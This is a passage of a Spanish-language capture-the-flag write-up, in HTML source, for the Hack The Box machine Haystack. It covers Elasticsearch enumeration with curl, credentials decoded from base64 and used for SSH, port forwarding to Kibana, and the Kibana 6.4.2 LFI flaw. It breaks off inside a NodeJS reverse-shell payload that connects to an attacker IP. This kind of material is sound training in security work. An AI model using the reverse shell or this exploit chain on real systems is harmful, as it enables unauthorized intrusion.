&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;hint---imagen&#34;&gt;Hint - Imagen&lt;/h4&gt;
&lt;p&gt;Dentro de la imagen que se encuentra en el index del puerto 80 encontramos una cadena en base64 con lo que parece un hint.&lt;br /&gt;
Imagen:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190629_172727.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Hint:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190629_172523.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster---puerto-9200&#34;&gt;GOBUSTER - Puerto 9200&lt;/h2&gt;
&lt;p&gt;Realizamos una busqueda de directorios y archivos en el puerto 9200 con gobuster.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/haystack# gobuster -u http://10.10.10.115:9200/ -w /usr/share/wordlists/dirb/common.txt -np -x txt,html -t &lt;span class=&#34;nv&#34;&gt;15&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
Gobuster v2.0.1              OJ Reeves &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Mode         : dir
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Url/Domain   : http://10.10.10.115:9200/
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Threads      : &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Wordlist     : /usr/share/wordlists/dirb/common.txt
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Status codes : 200,204,301,302,307,403
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Extensions   : txt,html
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Timeout      : &lt;span class=&#34;nv&#34;&gt;10s&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
2019/06/29 19:25:40 Starting &lt;span class=&#34;nv&#34;&gt;gobuster&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
/_stats &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/_template &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/bank &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/favicon.ico &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/quotes &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
2019/06/29 19:27:49 &lt;span class=&#34;nv&#34;&gt;Finished&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;=====================================================&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos algunos directorios no muy comunes, al visitar este puerto con firefox encontramos que esta corriendo un servidor de Elasticsearch en su version 6.4.2.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190629_172943.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al hacer una pequeña enumeracion encontramos 3 aliases, los cuales podemos utilizar para obtener informacion que esta almacenado en el servidor.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190629_173833.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el alias de &lt;code&gt;.kibana&lt;/code&gt; encontramos una vulnerabilidad de LFI pero esta no afecta a este alias del servidor.&lt;/p&gt;
&lt;p&gt;Para obtener informacion de uno de los aliases (index) vamos a utilizar el siguiente query:&lt;/p&gt;
&lt;p&gt;[&lt;strong&gt;Elasticsearch Query&lt;/strong&gt;](&lt;a href=&#34;https://stackoverflow.com/questions/8829468/elasticsearch-query-to-return-all-records&#34;&gt;https://stackoverflow.com/questions/8829468/elasticsearch-query-to-return-all-records&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;https://www.elastic.co/guide/en/elasticsearch/reference/current/full-text-queries.html&#34;&gt;https://www.elastic.co/guide/en/elasticsearch/reference/current/full-text-queries.html&lt;/a&gt;)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;curl -s -X GET &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://10.10.10.115:9200/bank/_search&amp;#34;&lt;/span&gt; -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;Content-Type: application/json&amp;#39;&lt;/span&gt; -d&lt;span class=&#34;s1&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;{
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  &amp;#34;size&amp;#34;: 5,
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  &amp;#34;query&amp;#34;:
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;   {
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;#34;match_all&amp;#34;: {}
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;   }
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;}
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El resultado del query son 5 valores que se encuentran dentro de &amp;lsquo;bank&amp;rsquo;, podemos hacer lo mismo para los demas aliases que encontramos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190629_174752.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En este caso vamos a buscar dentro del alias &amp;lsquo;quotes&amp;rsquo;, como anteriormente obtuvimos un &amp;lsquo;hint&amp;rsquo; en la imagen del index vamos a buscar en este caso la palabra &amp;ldquo;clave&amp;rdquo; dentro de este alias.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;curl -s -X GET http://10.10.10.115:9200/quotes/_search?q&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;clave &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; jq .
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190629_175810.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;hits&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nt&#34;&gt;&amp;#34;total&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;nt&#34;&gt;&amp;#34;max_score&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;5.9335938&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
    &lt;span class=&#34;nt&#34;&gt;&amp;#34;hits&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;
      &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nt&#34;&gt;&amp;#34;_index&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;quotes&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;nt&#34;&gt;&amp;#34;_type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;quote&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;nt&#34;&gt;&amp;#34;_id&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;45&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;nt&#34;&gt;&amp;#34;_score&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;5.9335938&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;nt&#34;&gt;&amp;#34;_source&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
          &lt;span class=&#34;nt&#34;&gt;&amp;#34;quote&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg &amp;#34;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
      &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
      &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nt&#34;&gt;&amp;#34;_index&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;quotes&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;nt&#34;&gt;&amp;#34;_type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;quote&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;nt&#34;&gt;&amp;#34;_id&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;111&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;nt&#34;&gt;&amp;#34;_score&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;5.3459888&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;nt&#34;&gt;&amp;#34;_source&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
          &lt;span class=&#34;nt&#34;&gt;&amp;#34;quote&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=&amp;#34;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Obtenemos dos resultados, los cuales nso muestran dos mensajes con una cadena en base64, al decodificarlos obtenemos credenciales.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190629_180158.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;user: security
pass: spanish.is.key
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;ssh---user-flag&#34;&gt;SSH - User flag&lt;/h2&gt;
&lt;p&gt;Ya que obtuvimos nuestras credenciales nos logeamos atravez del servicio ssh, obtenemos una shell y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190629_180413.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;kibana-642&#34;&gt;Kibana 6.4.2&lt;/h2&gt;
&lt;p&gt;Como vimos anteriormente encontramos un alias .kibana el cual no era afectado en el puerto 9200, al obtener una shell pudimos hacer una enumeracion y encontrar el archivo de configuracion en este caso kibana.yml el cual se encuentra en la carpeta &lt;code&gt;/etc/kibana/&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Vemos que la configuracion de este archivo tiene otro puerto en el cual esta corriendo el &amp;lsquo;backend&amp;rsquo; de la aplicacion, pero este solo esta disponible en la maquina de manera local.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190629_181315.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para poder ver lo que hay en el puerto 5601 vamos a hacer port forwarding, para traerlo localmente a nuestra maquina. Para ello utilizamos el siguiente comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ssh -L 5601:localhost:5601 security@10.10.10.115
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Verificamos con netstat que el puerto este activo en nuestra maquina:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190629_181642.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Visitamos el puerto de manera local y nos muestra una plataforma, en este caso la de Kibana.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/haystack/Screenshot_20190629_181807.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;lfi---kibana-642&#34;&gt;LFI - Kibana 6.4.2&lt;/h3&gt;
&lt;p&gt;Como lo dije anteriormente la version de Kibana 6.4.2 tiene una vulnerabilidad la cual permite ejecutar codigo mediante archivo javascript u obtener archivos mediante LFI, al explotar esta vulnerabilidad de LFI esta solo se ve reflejada dentro del archivo &amp;lsquo;log&amp;rsquo; de Kibana.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/&#34;&gt;&lt;strong&gt;Execute This&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/mpgn/CVE-2018-17246&#34;&gt;&lt;strong&gt;CVE-2018-17246&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=Tx44iY-Yt7I&#34;&gt;&lt;strong&gt;YouTube Kibana&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell&#34;&gt;&lt;strong&gt;Reverse Shell NodeJS&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Una cosa importante que debemos saber es de que, los archivos que se reflejan dentro del log son archivos a los que Kibana tiene acceso. Para obtener una shell tenemos que escribir un archivo javascript dentro de la maquina en un lugar donde el usuario Kibana tenga acceso, el codigo de la Shell Inversa es:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
    &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;net&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;net&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;cp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;child_process&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;sh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;cp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;spawn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]);&lt;/span&gt;
    &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;client&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;connect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1337&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;10.10.14.85&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;pipe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;stdin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;stdout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;pipe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
